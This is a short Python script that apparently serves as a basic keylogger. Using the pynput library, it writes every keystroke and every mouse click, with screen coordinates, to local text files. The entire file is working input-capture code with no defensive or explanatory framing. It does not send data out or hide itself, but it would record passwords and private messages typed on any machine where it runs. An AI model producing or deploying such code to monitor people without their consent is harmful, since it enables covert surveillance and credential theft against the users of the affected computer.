import pynput
import datetime
import utils

time = datetime.datetime.now()
new_start = "\nProgram Started: ---" + str(time) + "--- "
path = "keyboard_data.txt"
mouse_path = "mouse_data.txt"

utils.write_file(path, new_start)
utils.write_file(mouse_path, new_start)

def on_press(key):
    try:
        utils.write_file(path, key.char)
    except AttributeError:
        if key == pynput.keyboard.Key.space:
            utils.write_file(path, " ")
        else:
            utils.write_file(path, str(key))
    
def on_click(x, y, button, pressed):
    if pressed:
        data = "X = " + str(x) + " Y = " + str(y) + " " + str(button) + " ||| "
        utils.write_file(mouse_path, data)

mouse_listener = pynput.mouse.Listener(on_click=on_click) 
keyboard_listener = pynput.keyboard.Listener(on_press=on_press)

mouse_listener.start()
keyboard_listener.start()
mouse_listener.join()
keyboard_listener.join()
